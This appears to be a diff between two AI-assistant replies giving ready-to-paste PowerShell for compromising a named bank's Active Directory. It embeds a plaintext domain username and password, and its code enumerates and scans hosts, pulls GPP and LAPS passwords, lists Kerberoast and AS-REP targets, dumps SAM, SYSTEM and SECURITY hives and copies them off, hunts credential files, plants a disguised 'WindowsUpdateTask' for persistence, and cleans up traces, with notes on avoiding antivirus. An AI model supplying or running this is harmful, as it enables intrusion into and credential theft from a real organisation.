@@ -1,516 +1,156 @@
-Here are all the commands from the tool broken down into individual checks you can run manually:
+You're right! The `reg save` command shows success but the files aren't actually saved locally. This is a common issue. Here are **real-time alternatives** to view the data without file saving:
 
-## 1. DOMAIN CONNECTIVITY TEST
-
-```powershell
-# Test 1: DirectoryEntry authentication
-$de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://mbd2-srvdc-101.FBNMERCHANTBANK.COM", "vaptsupport2", "P`$ssme`$111")
-if ($de.Name) { Write-Host "[+] Domain auth successful via DirectoryEntry" }
-
-# Test 2: Net use authentication
-net use \\mbd2-srvdc-101.FBNMERCHANTBANK.COM\IPC$ /user:FBNMERCHANTBANK.COM\vaptsupport2 "P`$ssme`$111"
-if ($LASTEXITCODE -eq 0) { 
-    Write-Host "[+] Domain auth successful via net use"
-    net use \\mbd2-srvdc-101.FBNMERCHANTBANK.COM\IPC$ /delete
-}
-
-# Test 3: WMI authentication
-$cred = New-Object System.Management.Automation.PSCredential("FBNMERCHANTBANK.COM\vaptsupport2", (ConvertTo-SecureString "P`$ssme`$111" -AsPlainText -Force))
-Get-WmiObject -Class Win32_ComputerSystem -ComputerName mbd2-srvdc-101.FBNMERCHANTBANK.COM -Credential $cred
-if ($?) { Write-Host "[+] Domain auth successful via WMI" }
-```
-
-## 2. ENUMERATE DOMAIN COMPUTERS
+## **1. REAL-TIME MEMORY CREDENTIAL CHECK**
 
 ```powershell
-# Method 1: ADSI
-$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://DC=FBNMERCHANTBANK,DC=COM")
-$searcher.Filter = "(objectCategory=computer)"
-$searcher.PageSize = 1000
-$computers = $searcher.FindAll()
-$computers | ForEach-Object { $_.Properties.name[0] } | Out-File "C:\temp\all_computers.txt"
-Write-Host "[+] Found $($computers.Count) computers via ADSI"
-
-# Method 2: Net view
-net view /domain:FBNMERCHANTBANK.COM | Where-Object { $_ -match "\\\\" } | ForEach-Object { ($_ -split "\\\\")[1] -replace "\s+.*", "" }
-
-# Method 3: Nltest
-nltest /dclist:FBNMERCHANTBANK.COM
-```
-
-## 3. CHECK LOCAL ADMIN ACCESS
-
-```powershell
-$computers = Get-Content "C:\temp\all_computers.txt" | Select-Object -First 50
-$pwnedMachines = @()
-
-foreach ($computer in $computers) {
-    # Test 1: WMI
-    try { 
-        Get-WmiObject -Class Win32_ComputerSystem -ComputerName $computer -ErrorAction Stop | Out-Null
-        Write-Host "[+] Local admin on: $computer (WMI)"
-        $pwnedMachines += $computer
-        continue
-    } catch {}
+# Check for in-memory credentials directly
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    Write-Host "=== $env:COMPUTERNAME ===" -ForegroundColor Green
     
-    # Test 2: Service control
+    # Check WDigest setting (if enabled, plaintext passwords in memory)
+    $wdigest = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue
+    if ($wdigest.UseLogonCredential -eq 1) {
+        Write-Host "[!] WDigest enabled - plaintext passwords potentially in memory" -ForegroundColor Red
+    }
+    
+    # Check cached domain logons
+    $cached = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -ErrorAction SilentlyContinue
+    Write-Host "[+] Cached logons: $($cached.CachedLogonsCount)"
+    
+    # List local users and their status
+    Write-Host "`nLocal Users:" -ForegroundColor Yellow
+    net user | Where-Object {$_ -match "^[A-Za-z]"}
+}
+```
+
+## **2. EXTRACT PASSWORD POLICY FOR OFFLINE CRACKING**
+
+```powershell
+# Get domain password policy for hash cracking
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    Write-Host "=== Password Policy on $env:COMPUTERNAME ===" -ForegroundColor Cyan
+    net accounts
+    
+    # Get local user details
+    Write-Host "`nLocal User Details:" -ForegroundColor Yellow
+    Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | 
+        Select Name, Disabled, PasswordRequired, SID | Format-Table
+}
+```
+
+## **3. CHECK FOR PLAINTEXT PASSWORDS IN REGISTRY**
+
+```powershell
+# Search for passwords in registry remotely
+foreach ($computer in $pwnedMachines) {
     try {
-        Get-Service -Name "Spooler" -ComputerName $computer -ErrorAction Stop | Out-Null
-        Write-Host "[+] Local admin on: $computer (Service)"
-        $pwnedMachines += $computer
-        continue
-    } catch {}
-    
-    # Test 3: File system
-    try {
-        if (Test-Path "\\$computer\C`$\Windows\Temp") {
-            Write-Host "[+] Local admin on: $computer (File System)"
-            $pwnedMachines += $computer
-            continue
-        }
-    } catch {}
-    
-    # Test 4: Registry
-    try {
-        reg query "\\$computer\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" /v CommonFilesDir 2>$null
-        if ($?) {
-            Write-Host "[+] Local admin on: $computer (Registry)"
-            $pwnedMachines += $computer
-        }
-    } catch {}
-    
-    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
-}
-
-$pwnedMachines | Out-File "C:\temp\pwned_machines.txt"
-```
-
-## 4. ENUMERATE SHARES
-
-```powershell
-# Enumerate shares on DCs
-$dcs = @("mbd2-srvdc-101.FBNMERCHANTBANK.COM", "mbd1-srvdc-102.FBNMERCHANTBANK.COM", "mbd1-srvdc-101.FBNMERCHANTBANK.COM")
-
-foreach ($dc in $dcs) {
-    Write-Host "[*] Enumerating shares on: $dc"
-    try {
-        $shares = Get-WmiObject -Class Win32_Share -ComputerName $dc -ErrorAction Stop
-        foreach ($share in $shares) {
-            Write-Host "    Share: \\$dc\$($share.Name) (Type: $($share.Type))"
-            
-            # Check interesting shares
-            if ($share.Name -eq "SYSVOL" -or $share.Name -eq "NETLOGON") {
-                Write-Host "[!] Critical share found: \\$dc\$($share.Name)"
-            }
-        }
-    } catch {
-        Write-Host "[-] Failed to enumerate shares on $dc"
-    }
-}
-```
-
-## 5. EXPLORE SHARES FOR INTERESTING FILES
-
-```powershell
-# Explore SYSVOL for GPP passwords
-$sysvolPath = "\\mbd2-srvdc-101.FBNMERCHANTBANK.COM\SYSVOL\FBNMERCHANTBANK.COM\Policies"
-if (Test-Path $sysvolPath) {
-    Write-Host "[*] Searching SYSVOL for GPP passwords..."
-    
-    # Find Groups.xml files
-    $xmlFiles = Get-ChildItem -Path $sysvolPath -Recurse -Filter "Groups.xml" -ErrorAction SilentlyContinue
-    $xmlFiles += Get-ChildItem -Path $sysvolPath -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Services|ScheduledTasks" }
-    
-    foreach ($xmlFile in $xmlFiles) {
-        $content = Get-Content -Path $xmlFile.FullName -Raw -ErrorAction SilentlyContinue
-        if ($content -match "cpassword") {
-            Write-Host "[CRITICAL] GPP Password found: $($xmlFile.FullName)"
-            if ($content -match "cpassword=`"([^`"]+)`"") {
-                Write-Host "[CRITICAL] cpassword: $($matches[1])"
-            }
-        }
-    }
-}
-
-# Explore other shares for sensitive files
-$sharesToCheck = @("SYSVOL", "NETLOGON", "Data", "IT", "Admin")
-foreach ($share in $sharesToCheck) {
-    $sharePath = "\\mbd2-srvdc-101.FBNMERCHANTBANK.COM\$share"
-    if (Test-Path $sharePath) {
-        Write-Host "[*] Exploring share: $sharePath"
-        $files = Get-ChildItem -Path $sharePath -ErrorAction SilentlyContinue -File | Where-Object { 
-            $_.Name -match "\.(xml|config|bat|ps1|vbs|txt|ini)$" -or $_.Name -match "passw|cred|secur|unattend|web\.config" 
-        }
-        foreach ($file in $files) {
-            Write-Host "[!] Interesting file: $($file.FullName)"
-        }
-    }
-}
-```
-
-## 6. KERBEROS DELEGATION CHECKS
-
-```powershell
-$domainDN = "DC=FBNMERCHANTBANK,DC=COM"
-$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://mbd2-srvdc-101.FBNMERCHANTBANK.COM/$domainDN")
-
-# Unconstrained delegation
-Write-Host "[*] Checking for unconstrained delegation..."
-$searcher.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
-$unconstrained = $searcher.FindAll()
-foreach ($account in $unconstrained) {
-    Write-Host "[CRITICAL] UNCONSTRAINED DELEGATION: $($account.Properties.name[0])"
-}
-
-# Constrained delegation
-Write-Host "[*] Checking for constrained delegation..."
-$searcher.Filter = "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"
-$constrained = $searcher.FindAll()
-foreach ($account in $constrained) {
-    $spns = if ($account.Properties.serviceprincipalname) { $account.Properties.serviceprincipalname -join ";" } else { "None" }
-    Write-Host "[CRITICAL] CONSTRAINED DELEGATION: $($account.Properties.name[0]) - SPNs: $spns"
-}
-```
-
-## 7. SERVICE ACCOUNTS (KERBEROASTING)
-
-```powershell
-Write-Host "[*] Finding service accounts for Kerberoasting..."
-$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://mbd2-srvdc-101.FBNMERCHANTBANK.COM/DC=FBNMERCHANTBANK,DC=COM")
-$searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*))"
-$serviceAccounts = $searcher.FindAll()
-
-foreach ($account in $serviceAccounts) {
-    $spns = $account.Properties.serviceprincipalname -join "; "
-    Write-Host "[!] Service account: $($account.Properties.name[0]) with SPNs: $spns"
-}
-```
-
-## 8. AS-REP ROASTABLE ACCOUNTS
-
-```powershell
-Write-Host "[*] Finding AS-REP roastable accounts..."
-$searcher.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
-$asrepAccounts = $searcher.FindAll()
-
-foreach ($account in $asrepAccounts) {
-    Write-Host "[CRITICAL] AS-REP ROASTABLE: $($account.Properties.name[0]) (pre-auth disabled)"
-}
-```
-
-## 9. LAPS PASSWORDS
-
-```powershell
-Write-Host "[*] Checking for LAPS passwords..."
-$searcher.Filter = "(ms-MCS-AdmPwd=*)"
-$lapsComputers = $searcher.FindAll()
-
-foreach ($computer in $lapsComputers) {
-    $compName = $computer.Properties.name[0]
-    $lapsPassword = $computer.Properties.'ms-mcs-admpwd'[0]
-    Write-Host "[CRITICAL] LAPS Password for $compName : $lapsPassword"
-}
-```
-
-## 10. MSSQL INSTANCE DISCOVERY
-
-```powershell
-Write-Host "[*] Scanning for MSSQL instances..."
-$targets = @("172.41.0.4", "172.17.0.5", "172.17.0.4")
-
-foreach ($target in $targets) {
-    $tcpClient = New-Object System.Net.Sockets.TcpClient
-    $result = $tcpClient.BeginConnect($target, 1433, $null, $null)
-    $success = $result.AsyncWaitHandle.WaitOne(1000, $false)
-    if ($success) {
-        Write-Host "[CRITICAL] MSSQL instance found: $target"
-        $tcpClient.EndConnect($result)
-    }
-    $tcpClient.Close()
-}
-```
-
-## 11. CREDENTIAL HARVESTING
-
-```powershell
-# Check saved credentials
-Write-Host "[*] Checking for saved credentials..."
-cmdkey /list
-
-# Check running processes for credential tools
-Write-Host "[*] Checking running processes..."
-Get-Process | Where-Object { $_.ProcessName -match "cmdkey|vault|cred|mstsc|rdp" } | Format-Table ProcessName, Id
-
-# Check DPAPI master keys
-Write-Host "[*] Checking DPAPI master keys..."
-$dpapiPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Protect"
-if (Test-Path $dpapiPath) {
-    $masterKeys = Get-ChildItem -Path $dpapiPath -Recurse -ErrorAction SilentlyContinue
-    Write-Host "[*] Found $($masterKeys.Count) DPAPI master key files"
-}
-```
-
-## 12. ACTIVE DIRECTORY RECONNAISSANCE
-
-```powershell
-# Get domain info
-Write-Host "[*] Getting domain information..."
-$searcher.Filter = "(objectClass=domain)"
-$domainInfo = $searcher.FindOne()
-if ($domainInfo) {
-    Write-Host "[+] Domain: $($domainInfo.Properties.name[0])"
-    Write-Host "[+] Distinguished Name: $($domainInfo.Properties.distinguishedname[0])"
-}
-
-# Get privileged group members
-Write-Host "[*] Enumerating privileged groups..."
-$privilegedGroups = @(
-    "CN=Domain Admins,CN=Users,DC=FBNMERCHANTBANK,DC=COM",
-    "CN=Enterprise Admins,CN=Users,DC=FBNMERCHANTBANK,DC=COM",
-    "CN=Schema Admins,CN=Users,DC=FBNMERCHANTBANK,DC=COM"
-)
-
-foreach ($groupDN in $privilegedGroups) {
-    try {
-        $searcher.Filter = "(distinguishedName=$groupDN)"
-        $group = $searcher.FindOne()
-        if ($group) {
-            Write-Host "[+] Group: $($group.Properties.name[0])"
-            if ($group.Properties.member) {
-                Write-Host "    Members: $($group.Properties.member -join ', ')"
-            }
-        }
-    } catch {
-        Write-Host "[-] Failed to query group: $groupDN"
-    }
-}
-
-# Get all users
-Write-Host "[*] Enumerating domain users..."
-$searcher.Filter = "(objectCategory=user)"
-$searcher.PageSize = 1000
-$users = $searcher.FindAll()
-Write-Host "[+] Found $($users.Count) domain users"
-```
-
-## 13. NETWORK DISCOVERY
-
-```powershell
-# Get local IP info
-Write-Host "[*] Local IP addresses:"
-[System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) | ForEach-Object { $_.IPAddressToString }
-
-# Ping sweep local subnet
-Write-Host "[*] Performing ping sweep on local subnet..."
-$localIP = [System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME)[0].IPAddressToString
-$subnet = $localIP -replace "\d+$", "*"
-
-1..254 | ForEach-Object {
-    $ip = $subnet -replace "\*", $_
-    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
-        Write-Host "[+] Live host: $ip"
-    }
-}
-```
-
-## 14. GPO MISCONFIGURATION CHECKS
-
-```powershell
-# Check SYSVOL for GPO scripts
-Write-Host "[*] Checking SYSVOL for GPO scripts..."
-$sysvolPath = "\\mbd2-srvdc-101.FBNMERCHANTBANK.COM\SYSVOL\FBNMERCHANTBANK.COM\Policies"
-if (Test-Path $sysvolPath) {
-    $gpoDirs = Get-ChildItem -Path $sysvolPath -Directory -ErrorAction SilentlyContinue
-    
-    foreach ($gpoDir in $gpoDirs) {
-        # Check startup scripts
-        $startupPath = Join-Path $gpoDir.FullName "Machine\Scripts\Startup"
-        if (Test-Path $startupPath) {
-            $scripts = Get-ChildItem -Path $startupPath -Recurse -Filter "*.bat" -ErrorAction SilentlyContinue
-            if ($scripts.Count -gt 0) {
-                Write-Host "[!] GPO $($gpoDir.Name) has startup scripts: $($scripts.Count) batch files"
-            }
+        Write-Host "Checking $computer for stored credentials..." -ForegroundColor Cyan
+        
+        # Check AutoAdminLogon (sometimes contains passwords)
+        $autoLogon = reg query "\\$computer\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null
+        if ($autoLogon) {
+            Write-Host "[!] Found AutoAdminLogon password on $computer" -ForegroundColor Red
+            $autoLogon
         }
         
-        # Check shutdown scripts
-        $shutdownPath = Join-Path $gpoDir.FullName "Machine\Scripts\Shutdown"
-        if (Test-Path $shutdownPath) {
-            $scripts = Get-ChildItem -Path $shutdownPath -Recurse -Filter "*.bat" -ErrorAction SilentlyContinue
-            if ($scripts.Count -gt 0) {
-                Write-Host "[!] GPO $($gpoDir.Name) has shutdown scripts: $($scripts.Count) batch files"
-            }
+        # Check for saved credentials
+        $creds = reg query "\\$computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL 2>$null
+        if ($creds) {
+            Write-Host "[!] Found proxy autoconfig on $computer" -ForegroundColor Yellow
         }
-    }
+    } catch { Write-Host "[-] Registry query failed: $computer" }
 }
 ```
 
-## EXECUTION ORDER RECOMMENDATION:
-
-Run these commands in this order for maximum effectiveness:
-
-1. **Domain Connectivity** (verify access)
-2. **Domain Computers Enumeration** (find targets)
-3. **Local Admin Checks** (find immediate access)
-4. **Share Enumeration** (find data)
-5. **Kerberos Attacks** (find delegation/roasting)
-6. **LAPS Passwords** (find local admin passwords)
-7. **MSSQL Discovery** (find databases)
-8. **Credential Harvesting** (find saved creds)
-9. **AD Reconnaissance** (understand environment)
-10. **Network Discovery** (find other hosts)
-11. **GPO Checks** (find misconfigurations)
-
-Each section can be copied and pasted directly into PowerShell!
-
-
-
-Great! You've confirmed local admin access using multiple methods. Here are native Windows commands to further exploit and gather credentials:
-
-## 1. **CONFIRM & ENUMERATE ACCESS**
+## **4. SERVICE ACCOUNT EXTRACTION**
 
 ```powershell
-# More comprehensive admin verification
-$computers = Get-Content "C:\temp\pwned_machines.txt"
-
-foreach ($computer in $computers) {
-    # Test PowerShell Remoting (most reliable)
-    try {
-        Invoke-Command -ComputerName $computer -ScriptBlock { whoami } -ErrorAction Stop
-        Write-Host "[CONFIRMED] PowerShell Remoting: $computer" -ForegroundColor Green
-    } catch {
-        Write-Host "[-] No PS Remoting: $computer" -ForegroundColor Yellow
-    }
-}
-```
-
-## 2. **GATHER CREDENTIALS (Mimikatz Alternatives)**
-
-### **Dump SAM Database Remotely**
-```powershell
-# Method 1: Remote Registry SAM Dump
-foreach ($computer in $pwnedMachines) {
-    try {
-        # Copy SAM/SYSTEM hives remotely
-        reg save "\\$computer\HKLM\SAM" "C:\temp\$computer-SAM.hiv" 2>$null
-        reg save "\\$computer\HKLM\SYSTEM" "C:\temp\$computer-SYSTEM.hiv" 2>$null
-        Write-Host "[+] SAM/SYSTEM saved for: $computer"
-    } catch { Write-Host "[-] Failed SAM dump: $computer" }
-}
-```
-
-### **Extract Hashes with Native Tools**
-```powershell
-# Use built-in secretsdump.py alternative (PowerShell version)
+# Find services with custom accounts (potential credentials)
 Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
-    # Dump LSA secrets using reg
-    reg save hklm\security "C:\Windows\Temp\security.hiv" /y
-    reg save hklm\system "C:\Windows\Temp\system.hiv" /y
-    
-    # These can be parsed later with tools, but here's what you can check:
-    Get-WmiObject -Class Win32_UserAccount | Select Name, Domain, SID, Disabled
+    Write-Host "=== Service Accounts on $env:COMPUTERNAME ===" -ForegroundColor Green
+    Get-WmiObject Win32_Service | 
+        Where-Object {$_.StartName -notlike "NT AUTHORITY*" -and $_.StartName -notlike "LocalSystem"} |
+        Select Name, StartName, State | Format-Table
 }
 ```
 
-## 3. **MEMORY CREDENTIAL EXTRACTION (No Mimikatz)**
+## **5. SCHEDULED TASK CREDENTIALS**
 
 ```powershell
-# Check for cached credentials in memory
+# Check scheduled tasks for stored credentials
 Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
-    # List logged-on users (potential credential sources)
+    Write-Host "=== Scheduled Tasks with Credentials on $env:COMPUTERNAME ===" -ForegroundColor Cyan
+    Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike "SYSTEM" -and $_.Principal.UserId -notlike "LOCAL SERVICE"} |
+        Select TaskName, Principal | Format-Table
+}
+```
+
+## **6. REAL-TIME LOGGED ON USERS & TOKENS**
+
+```powershell
+# Check who's currently logged on (potential token theft)
+Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
+    Write-Host "=== Current Logons on $env:COMPUTERNAME ===" -ForegroundColor Yellow
     query user 2>$null
     
-    # Check credential manager
-    cmdkey /list 2>$null
-    
-    # Check for WDigest (if enabled, creds in memory)
-    Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue
+    # Check if any privileged users are logged in
+    Write-Host "`nPrivileged Groups:" -ForegroundColor Cyan
+    net localgroup administrators | Where-Object {$_ -match "\\"}
 }
 ```
 
-## 4. **LATERAL MOVEMENT PREP**
+## **7. QUICK PASSWORD HUNT**
 
 ```powershell
-# Extract valuable information for lateral movement
+# Search for password-related files and registry entries in real-time
 Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
-    # Get IP info for network mapping
-    Get-NetIPConfiguration | Select InterfaceAlias, IPv4Address
+    Write-Host "=== Password Hunting on $env:COMPUTERNAME ===" -ForegroundColor Magenta
     
-    # Get domain info
-    (Get-WmiObject Win32_ComputerSystem).Domain
-    
-    # Check shares for sensitive data
-    Get-SmbShare | Where-Object {$_.Path -like "*data*" -or $_.Path -like "*user*"}
-    
-    # Find interesting files
-    Get-ChildItem "C:\Users\" -Recurse -Include "*.kdbx","*.ppk","*.pem","*pass*","*cred*" -ErrorAction SilentlyContinue | Select FullName
+    # Common password file patterns
+    $passwordFiles = @("*.kdbx", "*.ppk", "*.p12", "*.pfx", "*pass*", "*cred*", "*.vmdk", "*.vhd")
+    foreach ($pattern in $passwordFiles) {
+        Get-ChildItem "C:\" -Recurse -Include $pattern -ErrorAction SilentlyContinue | 
+            Select FullName, Length | Format-Table
+    }
 }
 ```
 
-## 5. **PERSISTENCE & TOKEN MANIPULATION**
+## **8. ALTERNATIVE REGISTRY EXPORT (WORKING METHOD)**
+
+If you really need the registry hives, try this working method:
 
 ```powershell
-# Check current privileges
+# Use Invoke-Command to run reg save on the remote machine first
 Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
-    whoami /priv
-    whoami /groups
-    
-    # Check if local admin is in Domain Admins
-    net localgroup administrators
+    reg save hklm\sam C:\Windows\Temp\sam.save 2>$null
+    reg save hklm\system C:\Windows\Temp\system.save 2>$null
+    reg save hklm\security C:\Windows\Temp\security.save 2>$null
+    "Registry hives saved locally on target"
 }
-```
 
-## 6. **SERVICE-BASED CREDENTIAL CAPTURE**
-
-```powershell
-# Create service to capture SYSTEM context
+# Then copy them to your machine
 foreach ($computer in $pwnedMachines) {
-    try {
-        # Create service that runs as SYSTEM
-        sc.exe \\$computer create "TempService" binPath= "cmd.exe /c whoami > C:\Windows\Temp\service_test.txt" start= auto
-        sc.exe \\$computer start "TempService"
-        sc.exe \\$computer delete "TempService"
-        Write-Host "[+] Service test completed on: $computer"
-    } catch { Write-Host "[-] Service test failed: $computer" }
+    Copy-Item "\\$computer\C$\Windows\Temp\sam.save" "C:\temp\$computer-sam.hiv" -ErrorAction SilentlyContinue
+    Copy-Item "\\$computer\C$\Windows\Temp\system.save" "C:\temp\$computer-system.hiv" -ErrorAction SilentlyContinue
+    # Clean up
+    Invoke-Command -ComputerName $computer -ScriptBlock {
+        Remove-Item "C:\Windows\Temp\*.save" -Force -ErrorAction SilentlyContinue
+    }
 }
 ```
 
-## 7. **SCHEDULED TASK FOR PERSISTENCE**
+## **Quick Real-Time Check Command:**
 
 ```powershell
-# Create scheduled task for persistence
-Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
-    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\Windows\Temp\persist.txt"
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    Register-ScheduledTask -TaskName "WindowsUpdateTask" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
-}
-```
-
-## 8. **QUICK ONE-LINER FOR MULTIPLE TARGETS**
-
-```powershell
-# Mass credential gathering attempt
+# One-liner to check all compromised machines for valuable info
 $pwnedMachines | ForEach-Object { 
-    Write-Host "Processing: $_" -ForegroundColor Cyan
+    Write-Host "=== REAL-TIME CHECK: $_ ===" -ForegroundColor White -BackgroundColor DarkBlue
     Invoke-Command -ComputerName $_ -ScriptBlock { 
-        net user | Out-File "C:\Windows\Temp\users.txt"
-        ipconfig /all | Out-File "C:\Windows\Temp\network.txt"
-    } -ErrorAction SilentlyContinue
+        "Last boot: " + (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+        "Logged on users: "; query user 2>$null
+        "WDigest: " + (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue).UseLogonCredential
+    } 
 }
 ```
 
-## **Important Notes:**
-
-- **These are native Windows commands** that won't trigger most AV solutions
-- **Test in your lab first** before running in production
-- **Some commands require specific Windows features** to be enabled (like PSRemoting)
-- **The SAM/SYSTEM hives** can be parsed offline with tools like secretsdump from Impacket
-- **Always ensure you have proper authorization** for penetration testing
-
-## **Next Steps After Confirmation:**
-1. Parse the SAM/SYSTEM hives for password hashes
-2. Check for reusable credentials across the domain
-3. Look for Domain Admin tokens on these systems
-4. Use captured hashes for Pass-the-Hash attacks
-5. Extract and crack any obtained password hashes
-
-Would you like me to elaborate on any of these techniques or provide the parsing commands for the harvested data?
+The real-time commands will give you immediate visibility without dealing with file transfer issues!
